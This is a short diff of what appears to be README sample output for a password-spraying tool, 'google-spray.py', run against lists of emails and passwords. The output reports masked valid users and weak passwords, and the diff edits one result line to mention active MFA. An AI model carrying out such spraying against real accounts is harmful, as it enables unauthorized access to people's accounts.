@@ -22,7 +22,7 @@ $ python3 google-spray.py emails.txt passwords.txt
 [-] Invalid User: sam***************
 [-] Invalid User: sam***************
 [+] VALID USER: s.a***************
-[!!] WEAK PASSWORD FOUND: s.a*************** with P********
+    [!!] WEAK PASSWORD + MFA ACTIVE: jan*************** / P********  [MFA type: PWD]
 [-] Invalid User: sam***************
 [-] Invalid User: asa***************
 [-] Invalid User: a.s***************
